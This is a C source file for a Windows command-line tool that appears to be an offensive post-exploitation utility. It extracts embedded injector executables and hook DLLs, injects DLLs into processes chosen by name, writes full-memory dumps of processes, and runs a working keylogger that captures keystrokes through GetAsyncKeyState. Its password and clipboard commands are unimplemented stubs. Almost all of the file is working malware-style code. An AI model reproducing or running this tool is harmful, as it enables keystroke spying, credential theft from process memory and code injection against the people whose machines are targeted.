#include <windows.h>
// #include <winbase.h>
#include <tlhelp32.h>
#include <dbghelp.h>
// #include <strings.h>
#include <stdio.h>

#define PIPE_NAME "\\\\.\\pipe\\inj"
#ifdef __i386__
extern const char binary_bin_reader_exe_start[];
extern const char binary_bin_reader_exe_end[];

extern const char binary_bin_injector_x86_exe_start[];
extern const char binary_bin_injector_x86_exe_end[];

extern const char binary_bin_injector_x64_exe_start[];
extern const char binary_bin_injector_x64_exe_end[];

extern const char binary_bin_hooknt_x64_dll_start[];
extern const char binary_bin_hooknt_x64_dll_end[];

extern const char binary_bin_hooknt_x86_dll_start[];
extern const char binary_bin_hooknt_x86_dll_end[];
#endif
#ifdef __x86_64__
extern const char _binary_bin_reader_exe_start[];
extern const char _binary_bin_reader_exe_end[];

extern const char _binary_bin_injector_x86_exe_start[];
extern const char _binary_bin_injector_x86_exe_end[];

extern const char _binary_bin_injector_x64_exe_start[];
extern const char _binary_bin_injector_x64_exe_end[];

extern const char _binary_bin_hooknt_x64_dll_start[];
extern const char _binary_bin_hooknt_x64_dll_end[];

extern const char _binary_bin_hooknt_x86_dll_start[];
extern const char _binary_bin_hooknt_x86_dll_end[];
#endif

typedef BOOL(WINAPI *IsWow64Process2_t)(
    HANDLE hProcess,
    USHORT *pProcessMachine,
    USHORT *pNativeMachine);

static BOOL ExtractEmbeddedFile(const char *filename, const char *memPointer, unsigned long textSize)
{
    FILE *fileout = fopen(filename, "wb");
    if (fileout == NULL)
    {
        wprintf(L"[-] Unable to extract %s\n", filename);
        fflush(stdout);
        return FALSE;
    }
    fwrite(memPointer, 1, textSize, fileout);
    fclose(fileout);
    return TRUE;
}

BOOL ExtractEmbedded(void)
{
    const char *binaryData;
    unsigned long fileSize = 0;
    BOOL areExtracted = TRUE; 
#ifdef __i386__
    binaryData = binary_bin_reader_exe_start;
    fileSize = binary_bin_reader_exe_end - binary_bin_reader_exe_start;
    if (!ExtractEmbeddedFile("reader.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = binary_bin_injector_x86_exe_start;
    fileSize = binary_bin_injector_x86_exe_end - binary_bin_injector_x86_exe_start;
    if (!ExtractEmbeddedFile("injector.x86.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = binary_bin_injector_x64_exe_start;
    fileSize = binary_bin_injector_x64_exe_end - binary_bin_injector_x64_exe_start;
    if (!ExtractEmbeddedFile("injector.x64.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = binary_bin_hooknt_x86_dll_start;
    fileSize = binary_bin_hooknt_x86_dll_end - binary_bin_hooknt_x86_dll_start;
    if (!ExtractEmbeddedFile("hooknt.x86.dll", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = binary_bin_hooknt_x64_dll_start;
    fileSize = binary_bin_hooknt_x64_dll_end - binary_bin_hooknt_x64_dll_start;
    if (!ExtractEmbeddedFile("hooknt.x64.dll", binaryData, fileSize))
        areExtracted = FALSE;
#endif
#ifdef __x86_64__
    binaryData = _binary_bin_reader_exe_start;
    fileSize = _binary_bin_reader_exe_end - _binary_bin_reader_exe_start;
    if (!ExtractEmbeddedFile("reader.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = _binary_bin_injector_x86_exe_start;
    fileSize = _binary_bin_injector_x86_exe_end - _binary_bin_injector_x86_exe_start;
    if (!ExtractEmbeddedFile("injector.x86.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = _binary_bin_injector_x64_exe_start;
    fileSize = _binary_bin_injector_x64_exe_end - _binary_bin_injector_x64_exe_start;
    if (!ExtractEmbeddedFile("injector.x64.exe", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = _binary_bin_hooknt_x86_dll_start;
    fileSize = _binary_bin_hooknt_x86_dll_end - _binary_bin_hooknt_x86_dll_start;
    if (!ExtractEmbeddedFile("hooknt.x86.dll", binaryData, fileSize))
        areExtracted = FALSE;

    binaryData = _binary_bin_hooknt_x64_dll_start;
    fileSize = _binary_bin_hooknt_x64_dll_end - _binary_bin_hooknt_x64_dll_start;
    if (!ExtractEmbeddedFile("hooknt.x64.dll", binaryData, fileSize))
        areExtracted = FALSE;
#endif
    return areExtracted;
}

static void GetProcessIdsFromFilename(const wchar_t *filename, DWORD **processIds, DWORD *count)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W processEntry = {0};
        processEntry.dwSize = sizeof(PROCESSENTRY32W);

        if (Process32First(snapshot, &processEntry))
        {
            do
            {
                if (_wcsicmp(processEntry.szExeFile, filename) == 0)
                {
                    (*count)++;

                    // Use a temporary pointer to safely reallocate memory
                    DWORD *tempProcessIds = (DWORD *)realloc(*processIds, (*count) * sizeof(DWORD));
                    if (tempProcessIds == NULL)
                    {
                        // Handle memory allocation failure
                        fprintf(stderr, "Error: Unable to allocate memory.\n");
                        free(*processIds);
                        *processIds = NULL;
                        *count = 0;
                        CloseHandle(snapshot);
                        return;
                    }
                    *processIds = tempProcessIds;
                    (*processIds)[(*count) - 1] = processEntry.th32ProcessID;
                }
            } while (Process32Next(snapshot, &processEntry));
        }

        CloseHandle(snapshot);
    }
}

static BOOL GetTargetBitness(HANDLE hProcess, PBOOL isWin32, PBOOL isWOW64, PBOOL processIs32Bit)
{
    HMODULE hNtDll = GetModuleHandleW(L"kernel32.dll");
    if (hNtDll == 0)
    {
        wprintf(L"Cannot get handle for kernel32.dll, error %lu\n", GetLastError());
        fflush(stdout);
        return FALSE;
    }
    IsWow64Process2_t pIsWow64Process2 = (IsWow64Process2_t)GetProcAddress(hNtDll, "IsWow64Process2");
    USHORT processMachine;
    USHORT nativeMachine;
    if (pIsWow64Process2 == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Unable to load IsWow64Process2, error %lu\n", GetLastError());
        fflush(stdout);
        return FALSE;
    }
    if (!pIsWow64Process2(hProcess, &processMachine, &nativeMachine))
    {
        wprintf(L"[!] IsWOW64Process2 failed, error %lu\n", GetLastError());
        return FALSE;
    }

    if (processMachine == IMAGE_FILE_MACHINE_UNKNOWN)
    {
        *isWOW64 = FALSE;

        if (nativeMachine == IMAGE_FILE_MACHINE_IA64 || nativeMachine == IMAGE_FILE_MACHINE_AMD64 || nativeMachine == IMAGE_FILE_MACHINE_ARM64)
        {
            *isWin32 = FALSE;
            *processIs32Bit = FALSE;
            return TRUE;
        }

        if (nativeMachine == IMAGE_FILE_MACHINE_I386 || nativeMachine == IMAGE_FILE_MACHINE_ARM)
        {
            *isWin32 = TRUE;
            *processIs32Bit = TRUE;
            return TRUE;
        }

        wprintf(L"[!] Unknown Windows Architecture.\n");
        fflush(stdout);
        return FALSE;
    }

    *isWin32 = FALSE;
    *isWOW64 = TRUE;
    *processIs32Bit = TRUE;

    return TRUE;
}

static BOOL StartInjectionProcess(DWORD processId, const WCHAR* dllName)
{
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    if (hProcess == NULL)
    {
        wprintf(L"[!] Error: Unable to open process (Error %lu)\n", GetLastError());
        fflush(stdout);
        return FALSE;
    }

    BOOL isWin32;
    BOOL isWOW64;
    BOOL isProc32;

    if (!GetTargetBitness(hProcess, &isWin32, &isWOW64, &isProc32))
    {
        wprintf(L"[!] Failed trying to get process bitness data\n");
        fflush(stdout);
        CloseHandle(hProcess);
        return FALSE;
    }
    CloseHandle(hProcess);

    // print details about the process about to be injected
    wprintf(L"[i] PID %lu Details:\n", processId);
    wprintf(L"[i] OS: %ls\n", isWin32 ? L"x86" : L"x64");
    wprintf(L"[i] WOW64: %ls\n", isWOW64 ? L"true" : L"false");
    wprintf(L"[i] Process: %ls\n", isProc32 ? L"x86" : L"x64");
    wprintf(L"[+] Initiating injection...\n");
    fflush(stdout);

    // Construct the full paths based on bitness
    wchar_t injectCmd[MAX_PATH] = L"";
    swprintf_s(
        injectCmd,
        MAX_PATH,
        L"injector.%ls.exe %ls.%ls.dll %li",
        (isWin32 || isWOW64) ? L"x86" : L"x64",
        dllName,
        (isWin32 || isWOW64) ? L"x86" : L"x64",
        processId);
    // determine which injector to start

    wprintf(L"[+] %ls\n", injectCmd);
    fflush(stdout);

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    HANDLE pipeOut = CreateFileA(
        PIPE_NAME,          // Filename
        GENERIC_WRITE,      // Desired access
        FILE_SHARE_WRITE,   // Share mode
        &sa,                // Security attributes
        OPEN_EXISTING,      // Open existing pipe
        0,                  // Flags and attributes
        NULL);              // Template file

    if(pipeOut == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Unable to open pipe file for handling output, error %lu\n", GetLastError());
        return FALSE;
    }
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.wShowWindow = SW_SHOW;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = NULL;
    si.hStdError = pipeOut;
    si.hStdOutput = pipeOut;

    DWORD flags = NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW;

    BOOL bResult = CreateProcessW(
        NULL,       // No module name (use command line)
        injectCmd,  // Command line
        NULL,       // Process handle not inheritable
        NULL,       // Thread handle not inheritable
        TRUE,       // Set handle inheritance to TRUE
        flags,      // creation flags
        NULL,       // Use parent's environment block
        NULL,       // Use parent's starting directory
        &si,        // Pointer to STARTUPINFO structure
        &pi);       // Pointer to PROCESS_INFORMATION structure

    if (!bResult)
    {
        wprintf(L"[-] Unable to create injection process for PID %lu, error %lu", processId, GetLastError());
        return FALSE;
    }    

    WaitForSingleObject(pi.hThread, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(pipeOut);
    return TRUE;

}

DWORD WINAPI ThreadNamedPipe(LPVOID lpreserved)
{
    // create named pipe
    HANDLE hPipe = CreateNamedPipeA(
        PIPE_NAME,
        PIPE_ACCESS_DUPLEX |        // Pipe open mode (read/write)
        FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE |         // Message type pipe
        PIPE_READMODE_MESSAGE |     // Message-read mode
        PIPE_WAIT,                  // Blocking mode
        PIPE_UNLIMITED_INSTANCES,   // Max instances
        0,
        0,
        NMPWAIT_USE_DEFAULT_WAIT,
        NULL);

    if(hPipe == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Error creating named pipe\n");
        return 1;
    }
    if(hPipe == NULL)
    {
        wprintf(L"[-] Invalid named pipe handle!\n");
        return 1;
    }
    BYTE readBuffer[1024];
    DWORD dwRead;

    ZeroMemory(readBuffer, 1024);

    while (hPipe != INVALID_HANDLE_VALUE)
    {
        // wait for clients to connect to the pipe
        if (ConnectNamedPipe(hPipe, NULL) != FALSE)
        {
            while (ReadFile(hPipe, readBuffer, sizeof(readBuffer) / 2 - 1, &dwRead, NULL) != FALSE)
            {
                readBuffer[dwRead] = '\0';
                wprintf(L"%s", readBuffer);
            }
            fflush(stdout);
        }
        DisconnectNamedPipe(hPipe);
    }
    return 0;
}

static void PrintUsage(WCHAR* name)
{
    wprintf(L"Usage: %ls <dump inject keylog clipboard passwords>\n", name);
    wprintf(L"extract - extract all files embedded inside this executable\n");
    wprintf(L"dump <process_name> - dumps memory of the process to process_name.pid.dmp\n");
    wprintf(L"inject <process_name | pid> <dll> - injects dll into process_name or process id\n");
    wprintf(L"keylog - prints keys pressed\n");
    wprintf(L"clipboard - prints clipboard text history\n");
    wprintf(L"passwords - prints passwords found in the registry\n");
}


static inline void ShiftPressed()
{
        if(GetAsyncKeyState(VK_SHIFT) & 0x8000)
            wprintf(L"[^]");
}

static void PrintKey(BYTE pKey)
{
    switch(pKey)
    {
    case VK_SHIFT:
        break;
    case 0x41 ... 0x5A:
        ShiftPressed();
        wprintf(L"%c", pKey);
        break;
    case 0x30 ... 0x39:
        ShiftPressed();
        wprintf(L"%c", pKey);
        break;
    case VK_OEM_1:
        ShiftPressed();
        wprintf(L";");
        break;
    case VK_OEM_2: 
        ShiftPressed();
        wprintf(L"/");
        break;
    case VK_OEM_3: 
        ShiftPressed();
        wprintf(L"`");
        break;
    case VK_OEM_4:
        ShiftPressed();
        wprintf(L"[");
        break;
    case VK_OEM_5:
        ShiftPressed();
        wprintf(L"\\");
        break;
    case VK_OEM_6:
        ShiftPressed();
        wprintf(L"]");
        break;
    case VK_OEM_MINUS:
        ShiftPressed();
        wprintf(L"-");
        break;
    case VK_OEM_PLUS: 
        ShiftPressed();
        wprintf(L"+");
        break;
    case VK_OEM_COMMA:
        ShiftPressed();
        wprintf(L",");
        break;
    case VK_BACK:
        ShiftPressed();
        wprintf(L"[BCKSP]");
        break;
    case VK_LBUTTON:
        ShiftPressed();
        wprintf(L"[LMB]");
        break;
    case VK_RBUTTON:
        ShiftPressed();
        wprintf(L"[RMB]");
        break;
    case VK_RETURN:
        ShiftPressed();
        wprintf(L"[ENT]\n");
        break;
    case VK_TAB:
        ShiftPressed();
        wprintf(L"[TAB]");
        break;
    case VK_ESCAPE:
        ShiftPressed();
        wprintf(L"[ESC]");
        break;
    case VK_CONTROL:
        ShiftPressed();
        wprintf(L"[CTRL]");
        break;
    case VK_MENU:
        ShiftPressed();
        wprintf(L"[ALT]");
        break;
    case VK_CAPITAL:
        ShiftPressed();
        wprintf(L"[CAP]");
        break;
    case VK_SPACE:
        ShiftPressed();
        wprintf(L" ");
        break;
    case VK_UP:
        ShiftPressed();
        wprintf(L"[UP]");
        break;    
    case VK_DOWN:
        ShiftPressed();
        wprintf(L"[DOWN]");
        break;
    case VK_LEFT:
        ShiftPressed();
        wprintf(L"[LEFT]");
        break;
    case VK_RIGHT:
        ShiftPressed();
        wprintf(L"[RIGHT]");
        break;
    case VK_LSHIFT: break;
    case VK_RSHIFT: break;
    case VK_LCONTROL: break;
    case VK_RCONTROL: break;
    case VK_LMENU: break;
    case VK_RMENU: break;
    case VK_LWIN: 
        ShiftPressed();
        wprintf(L"[WIN]");
        break;
    case VK_RWIN:
        ShiftPressed();
        wprintf(L"[WIN]");
        break;
    default:
        ShiftPressed();
        wprintf(L"[0x%x]", pKey & 0xff);
        break;
    }
}

BOOL CommandKeylog()
{
    Sleep(150);
    while(1)
    {
        Sleep(40);
        for(BYTE i = 11; i <= 255; i++) 
        {
            if(GetAsyncKeyState(i) & 0x0001)
            {
                PrintKey(i);
            }
        }
    }
}

BOOL CommandExtract()
{
    if (!ExtractEmbedded())
    {
        wprintf(L"[-] Unable to extract all embedded binaries, continuing ...\n");
        return FALSE;
    }
    wprintf(L"[+] Finished extracting files successfully!\n");
    return TRUE;
}

BOOL CommandInject(WCHAR* process, WCHAR* dllPath)
{
    DWORD *processIds = NULL;
    DWORD count = 0;

    GetProcessIdsFromFilename(process, &processIds, &count);

    if (count == 0)
    {
        wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", process);
        free(processIds);
        return FALSE;
    }
    // Create thread to continuously read from the named pipe
    CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
    for (DWORD i = 0; i < count; i++)
    {
        // Create thread to continuously read from the named pipe
        CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
        wprintf(L"[*] Trying to inject into PID %lu\n", processIds[i]);
        if(!StartInjectionProcess(processIds[i], dllPath))
        {
            wprintf(L"[-] Unable to inject into PID %lu\n", processIds[i]);
        }
        fflush(stdout);
    }

    free(processIds);
    return TRUE;
}

BOOL CommandDump(WCHAR* process)
{
    DWORD* processIds = NULL;
    DWORD count = 0;
    GetProcessIdsFromFilename(process, &processIds, &count);
    if (count == 0)
    {
        wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", process);
        free(processIds);
        return FALSE;
    }
    BOOL areDumped = TRUE;
    for (DWORD i = 0; i < count; i++)
    {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processIds[i]);
        if(hProcess == INVALID_HANDLE_VALUE)
        {
            wprintf(L"[-] Unable to open handle with proper access to %ls and PID %lu\n", process, processIds[i]);
            areDumped = FALSE;
            continue;
        }
        wprintf(L"[+] Handle address for PID %lu is 0x%p\n", processIds[i], hProcess);
        WCHAR dumpFileName[512];
        _snwprintf(dumpFileName, sizeof(dumpFileName), L"%s.%i.dmp", process, processIds[i]);
        HANDLE hDumpFile = CreateFileW(dumpFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // BOOL isWin32;
        // BOOL isWOW64;
        // BOOL isProc32;

        // if (!GetTargetBitness(hProcess, &isWin32, &isWOW64, &isProc32))
        // {
        //     wprintf(L"[!] Failed trying to get process bitness data\n");
        //     fflush(stdout);
        //     CloseHandle(hProcess);
        //     return FALSE;
        // }

        if(hDumpFile == INVALID_HANDLE_VALUE)
        {
            wprintf(L"[-] Unable to create file with name %ls\n", dumpFileName);
            areDumped = FALSE;
            continue;
        }
        BOOL isDumped = MiniDumpWriteDump(hProcess, processIds[i], hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
        if(!isDumped)
        {
            areDumped = FALSE;
            wprintf(L"[-] Unable to dump %ls with PID: %lu, error %lu\n", process, processIds[i], GetLastError());
        }
        else
        {
            wprintf(L"[-] Dump %ls with PID: %lu into file %ls\n", process, processIds[i], dumpFileName);
        }
        CloseHandle(hProcess);
        CloseHandle(hDumpFile);
    }
    wprintf(L"[i] Dumping %i process(es) finished\n", count);
    if(areDumped == FALSE)
    {
        wprintf(L"[-] Unable to dump all process(es)\n");
    }
    return areDumped;
}

int wmain(int argc, wchar_t *argv[])
{
    WCHAR* programPath = argv[0];
    if(argc < 2)
    {
        PrintUsage(programPath);
        return 0;
    }

    setbuf(stdout, NULL);

    if(wcscmp(argv[1], L"extract") == 0)
    {
        CommandExtract();
        return 1;        
    }
    else if(wcscmp(argv[1], L"inject") == 0)
    {
        if(argc != 4)
        {
            wprintf(L"[-] Invalid arguments for inject\n");
            PrintUsage(programPath);
            return 0;
        }
        WCHAR* process = argv[2];
        WCHAR* dllPath = argv[3];
        if(CommandInject(process, dllPath) == FALSE)
            return 0;
    }
    else if(wcscmp(argv[1], L"dump") == 0)
    {
        if(argc != 3)
        {
            wprintf(L"[-] Invalid arguments for dump\n");
            PrintUsage(programPath);
            return 0;
        }
        WCHAR* process = argv[2];
        CommandDump(process);
        return 1;
    }
    else if(wcscmp(argv[1], L"keylog") == 0)
    {
        CommandKeylog();
        //PrintUsage(programPath);
        return 0;
    }
    else if(wcscmp(argv[1], L"passwords") == 0)
    {
        PrintUsage(programPath);
        return 0;
    }
    else if(wcscmp(argv[1], L"clipboard") == 0)
    {
        PrintUsage(programPath);
        return 0;
    }
    else
    {
        PrintUsage(programPath);
        wprintf(L"[-] Unknown command.\n");
        return 0;
    }
    
    WCHAR readAction[1024];
    BOOL loop = TRUE;

    // Get the console window handle
    HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);

    // Get console screen buffer info
    CONSOLE_SCREEN_BUFFER_INFO cBufferInfo = {0};
    GetConsoleScreenBufferInfo(consoleHandle, &cBufferInfo);
    
    Sleep(100);
    wprintf(L"[!] press \"x\" to exit, other key to continue...\n");

    // Calculate the bottom row position
    DWORD botRow = cBufferInfo.srWindow.Bottom;

    while(loop)
    {
        // Set the cursor position to the bottom row
        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), (COORD){0, botRow});

        // Print a message on the bottom row
        wprintf(L"> ");
        wscanf(L"%ls", readAction);
        if(wcscmp(readAction, L"x") == 0) loop = FALSE;
        
        // Move the cursor back to a new line
        // SetCursorPosition(0, bottomRow + 1);
        fflush(stdout);
    }

    wprintf(L"Exiting...\n");
    return 0;
}
